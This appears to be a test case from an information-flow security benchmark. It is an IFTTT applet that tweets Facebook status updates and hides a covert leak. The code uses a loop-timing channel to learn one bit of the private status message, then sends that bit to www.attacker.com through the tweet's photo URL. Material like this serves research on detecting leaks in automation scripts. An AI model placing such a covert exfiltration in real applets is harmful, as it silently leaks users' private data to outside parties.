//Maker: djuiceman
//Link2Applet: https://ifttt.com/applets/1789p-tweet-your-facebook-status-updates
//Title of Applet: Tweet your Facebook status updates  
//Trigger service: Facebook
//Action service:Twitter
//Policy/Presence:  Confidentiality of status updates / NO

msg = lbl("Facebook.newStatusMessageByYou.Message");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (msg.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


attack = urll("www.attacker.com?" + res);
sink('Twitter.postNewTweetWithImage', 'setTweet', msg);
sink('Twitter.postNewTweetWithImage', 'setPhotoUrl', attack);

